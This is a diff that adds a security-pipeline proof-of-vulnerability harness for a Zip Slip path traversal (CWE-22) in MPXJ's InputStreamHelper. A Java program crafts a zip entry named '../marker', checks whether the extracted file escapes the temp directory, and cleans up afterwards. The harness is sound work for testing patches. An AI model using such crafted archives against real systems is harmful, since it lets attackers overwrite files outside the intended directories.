@@ -1,0 +1,129 @@
+diff --git a/.security-pipeline/pov/ZipSlipPov.java b/.security-pipeline/pov/ZipSlipPov.java
+new file mode 100644
+index 0000000..1e98e2f
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPov.java
+@@ -0,0 +1,87 @@
++/*
++ * Proof-of-Vulnerability: CWE-022 Zip Slip path traversal in
++ * net.sf.mpxj.common.InputStreamHelper.writeZipStreamToTempDir(InputStream).
++ *
++ * The vulnerable code builds the output file with
++ *     File file = new File(dir, entry.getName());
++ * without verifying the resolved path stays inside `dir`. A crafted zip entry
++ * whose name contains "../" therefore writes a file OUTSIDE the temporary
++ * extraction directory.
++ *
++ * This POV exercises the real project method (no simulation) and:
++ *   - exits 0 when the traversal succeeds (unpatched / vulnerable code)
++ *   - exits non-zero when the traversal is blocked (correctly patched code)
++ */
++
++import java.io.ByteArrayInputStream;
++import java.io.ByteArrayOutputStream;
++import java.io.File;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import net.sf.mpxj.common.InputStreamHelper;
++
++public class ZipSlipPov
++{
++   public static void main(String[] args) throws Exception
++   {
++      String marker = "mpxj_zipslip_pov_" + System.nanoTime() + ".txt";
++      // Single "../" escapes the extraction temp dir into its parent directory.
++      String maliciousEntryName = "../" + marker;
++      byte[] payload = "OWNED-BY-ZIP-SLIP-POV".getBytes("UTF-8");
++
++      // Build a real zip stream containing the traversal entry.
++      ByteArrayOutputStream baos = new ByteArrayOutputStream();
++      ZipOutputStream zos = new ZipOutputStream(baos);
++      ZipEntry entry = new ZipEntry(maliciousEntryName);
++      zos.putNextEntry(entry);
++      zos.write(payload);
++      zos.closeEntry();
++      zos.close();
++
++      File extractedDir = null;
++      File escapedFile = null;
++      try
++      {
++         // Drive the actual vulnerable project code.
++         extractedDir = InputStreamHelper.writeZipStreamToTempDir(
++               new ByteArrayInputStream(baos.toByteArray()));
++
++         File parent = extractedDir.getCanonicalFile().getParentFile();
++         escapedFile = new File(parent, marker);
++
++         boolean escaped =
++               escapedFile.exists()
++               && !escapedFile.getCanonicalPath()
++                     .startsWith(extractedDir.getCanonicalPath() + File.separator);
++
++         if (escaped)
++         {
++            System.out.println("[VULNERABLE] Zip Slip succeeded.");
++            System.out.println("  Extraction dir : " + extractedDir.getCanonicalPath());
++            System.out.println("  Escaped file   : " + escapedFile.getCanonicalPath());
++            System.exit(0);
++         }
++
++         System.out.println("[NOT VULNERABLE] Malicious entry did not escape the extraction dir.");
++         System.exit(1);
++      }
++      catch (Exception ex)
++      {
++         // A correct patch rejects the traversal entry (e.g. throws) -> not exploited.
++         System.out.println("[NOT VULNERABLE] Extraction rejected the traversal entry: " + ex);
++         System.exit(1);
++      }
++      finally
++      {
++         if (escapedFile != null && escapedFile.exists())
++         {
++            escapedFile.delete();
++         }
++         if (extractedDir != null)
++         {
++            net.sf.mpxj.common.FileHelper.deleteQuietly(extractedDir);
++         }
++      }
++   }
++}
+diff --git a/.security-pipeline/pov/classes/ZipSlipPov.class b/.security-pipeline/pov/classes/ZipSlipPov.class
+new file mode 100644
+index 0000000..b821832
+Binary files /dev/null and b/.security-pipeline/pov/classes/ZipSlipPov.class differ
+diff --git a/.security-pipeline/pov/classes/net/sf/mpxj/common/FileHelper.class b/.security-pipeline/pov/classes/net/sf/mpxj/common/FileHelper.class
+new file mode 100644
+index 0000000..15077b4
+Binary files /dev/null and b/.security-pipeline/pov/classes/net/sf/mpxj/common/FileHelper.class differ
+diff --git a/.security-pipeline/pov/classes/net/sf/mpxj/common/InputStreamHelper.class b/.security-pipeline/pov/classes/net/sf/mpxj/common/InputStreamHelper.class
+new file mode 100644
+index 0000000..460997e
+Binary files /dev/null and b/.security-pipeline/pov/classes/net/sf/mpxj/common/InputStreamHelper.class differ
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..dffa9ac
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,18 @@
++#!/usr/bin/env bash
++# Compile the real project classes involved in the vulnerability together with
++# the POV, then run the POV. Exits 0 only when the Zip Slip traversal succeeds.
++set -euo pipefail
++
++REPO="/workspace/repo"
++POV_DIR="${REPO}/.security-pipeline/pov"
++OUT="${POV_DIR}/classes"
++
++rm -rf "${OUT}"
++mkdir -p "${OUT}"
++
++javac -d "${OUT}" \
++  "${REPO}/src/main/java/net/sf/mpxj/common/FileHelper.java" \
++  "${REPO}/src/main/java/net/sf/mpxj/common/InputStreamHelper.java" \
++  "${POV_DIR}/ZipSlipPov.java"
++
++java -cp "${OUT}" ZipSlipPov
